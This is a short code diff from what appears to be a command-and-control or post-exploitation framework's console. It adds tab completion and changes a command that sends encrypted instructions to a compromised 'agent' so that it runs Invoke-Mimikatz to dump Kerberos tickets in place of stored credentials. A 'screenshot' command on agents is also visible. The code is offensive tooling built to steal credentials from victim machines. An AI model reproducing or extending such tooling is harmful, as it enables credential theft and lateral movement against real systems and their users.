@@ -12,6 +12,14 @@ import time
 import os
 
 
+def Command_Completer(text, state):
+    options = [i for i in cmd.COMMANDS if i.startswith(text)]
+    if state < len(options):
+        return options[state]
+    else:
+        return None
+
+
 class cmd:
     COMMANDS = ['exit',
      'show',
@@ -332,7 +340,7 @@ class cmd:
             print "you can't use this command in main ! chose an agent"
             return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Invoke-Mimikatz -DumpCreds"))
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""Invoke-Mimikatz -Command '"privilege::debug" "SEKURLSA::Tickets"'"""))
 
     def screenshot(self, args=None):
         if config.get_pointer()=='main':
